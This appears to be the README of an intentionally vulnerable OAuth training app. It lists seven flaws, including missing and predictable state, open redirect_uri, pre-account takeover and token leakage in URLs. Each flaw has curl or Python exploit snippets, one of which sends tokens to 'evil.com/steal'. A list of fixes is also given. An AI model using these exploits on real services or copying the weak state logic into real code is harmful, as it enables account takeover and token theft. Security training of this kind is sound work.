# OAuth Authentication Vulnerabilities

> [!CAUTION]
> **CRITICAL SECURITY VULNERABILITIES** - For educational/testing purposes only. Never use in production.

## Overview

Implemented OAuth 2.0 authentication with **7 major vulnerabilities** based on real-world exploits from HackerOne, OWASP, and Medium.

---

## Vulnerabilities

### 1. Missing State Parameter Validation (CSRF)

**Severity**: Critical  
**Source**: HackerOne, OWASP

**Vulnerability**: The `state` parameter is generated but never validated, allowing CSRF/Login CSRF attacks.

**Location**: `server/src/controllers/oauth.controller.ts` - `handleOAuthCallback()`

**Exploit**:
```bash
# 1. Attacker initiates OAuth for their account
curl -X GET "http://localhost:3000/api/oauth/initiate/google"
# Gets: state=STATE-google-1234567890

# 2. Attacker crafts malicious link with their state
MALICIOUS_LINK="http://localhost:3000/mock-oauth/google/authorize?client_id=mock&redirect_uri=http://localhost:5173/oauth/callback&state=STATE-google-1234567890"

# 3. Victim clicks link and authorizes
# 4. Victim's account is now linked to attacker's OAuth
```

**Impact**: Account takeover - victim's account linked to attacker's social media.

---

### 2. Insufficient Redirect URI Validation

**Severity**: Critical  
**Source**: OWASP

**Vulnerability**: Accepts any `redirect_uri`, allowing token theft via open redirect.

**Location**: `server/src/controllers/oauth.controller.ts` - `initiateOAuth()`

**Exploit**:
```bash
# Attacker uses their own redirect_uri
curl -X GET "http://localhost:3000/api/oauth/initiate/google?redirect_uri=http://evil.com/steal"

# OAuth tokens will be sent to attacker's server
```

**Impact**: Authorization code/token theft, account takeover.

---

### 3. Pre-Account Takeover

**Severity**: Critical  
**Source**: HackerOne, Medium

**Vulnerability**: Automatic account linking without email verification.

**Location**: `server/src/controllers/oauth.controller.ts` - `handleOAuthCallback()`

**Exploit**:
```bash
# 1. Attacker registers with victim's email
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","password":"attacker123","name":"Attacker"}'

# 2. Victim later tries to login with Google OAuth using victim@example.com
# 3. System links victim's Google to attacker's pre-existing account
# 4. Attacker logs in with password and accesses victim's data
```

**Impact**: Complete account takeover before victim even creates account.

---

### 4. Account Linking Race Condition

**Severity**: High  
**Source**: HackerOne

**Vulnerability**: No locking mechanism during account linking.

**Location**: `server/src/controllers/oauth.controller.ts` - `handleOAuthCallback()`, line ~104

**Exploit**:
```bash
# Send multiple concurrent OAuth requests
for i in {1..10}; do
  curl -X GET "http://localhost:3000/api/oauth/callback?code=CODE_$i&state=STATE&provider=google" &
done
wait
```

**Impact**: Data corruption, multiple accounts linked to same OAuth.

---

### 5. Token Leakage via URL Parameters

**Severity**: Medium-High  
**Source**: OWASP, Medium

**Vulnerability**: OAuth tokens and JWT in URL parameters leak via Referer header.

**Location**: `server/src/controllers/oauth.controller.ts` - `handleOAuthCallback()`, line ~148

**Exploit**:
```bash
# 1. User completes OAuth, gets redirected to:
# /oauth/success?token=JWT_TOKEN&oauth_token=OAUTH_TOKEN

# 2. User clicks any external link on the page
# 3. Referer header leaks: Referer: http://app.com/oauth/success?token=JWT_TOKEN...

# 4. Attacker's server logs the Referer and steals tokens
```

**Impact**: Token theft, session hijacking.

---

### 6. No Email Verification

**Severity**: High  
**Source**: OWASP

**Vulnerability**: Accounts created/linked via OAuth without email verification.

**Location**: `server/src/controllers/oauth.controller.ts` - `handleOAuthCallback()`

**Code**:
```typescript
emailVerified: false, // VULNERABILITY: Not verified
```

**Impact**: Attacker can create accounts with unverified emails.

---

### 7. Weak State Generation

**Severity**: Medium  
**Source**: HackerOne

**Vulnerability**: Predictable state parameter based on timestamp.

**Location**: `server/src/controllers/oauth.controller.ts` - `initiateOAuth()`, line ~33

**Code**:
```typescript
const state = `STATE-${provider}-${Date.now()}`;
```

**Exploit**:
```python
import time

# Predict state values
current_time = int(time.time() * 1000)
predicted_states = [
    f"STATE-google-{current_time + i}"
    for i in range(-1000, 1000)
]
```

**Impact**: CSRF protection bypass.

---

## Testing

### Setup
```bash
./deploy.sh all
```

### Test OAuth Flow
1. Navigate to `/login`
2. Click "Login with Google" or "Login with GitHub"
3. Mock OAuth consent screen appears
4. Click "Allow"
5. Redirected back with vulnerabilities displayed

### Test Pre-Account Takeover
```bash
# 1. Register with victim email
curl -X POST http://localhost:3000/api/auth/register \
  -d '{"email":"victim@test.com","password":"attacker","name":"Attacker"}'

# 2. Login via OAuth with same email
# Click "Login with Google" in UI
# System links to attacker's account
```

---

## Secure Implementation

To fix these vulnerabilities:

1. **State Validation**: Store state server-side, validate on callback
2. **Redirect URI Whitelist**: Only allow pre-registered URIs
3. **Email Verification**: Send verification email before linking
4. **Database Locking**: Use transactions with row-level locks
5. **Token in Body**: Use POST with tokens in body, not URL
6. **Cryptographic State**: Use `crypto.randomBytes()` for state
7. **PKCE**: Implement Proof Key for Code Exchange

---

## API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/oauth/initiate/:provider` | GET | Start OAuth flow |
| `/api/oauth/callback` | GET | Handle OAuth redirect |
| `/api/oauth/link` | POST | Link OAuth to existing account |
| `/mock-oauth/:provider/authorize` | GET | Mock OAuth consent |
| `/mock-oauth/:provider/token` | POST | Mock token exchange |

---

## References

- [OWASP OAuth 2.0 Security](https://owasp.org/www-community/vulnerabilities/OAuth)
- [HackerOne OAuth Reports](https://hackerone.com/reports?q=oauth)
- [RFC 6749 - OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc6749)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
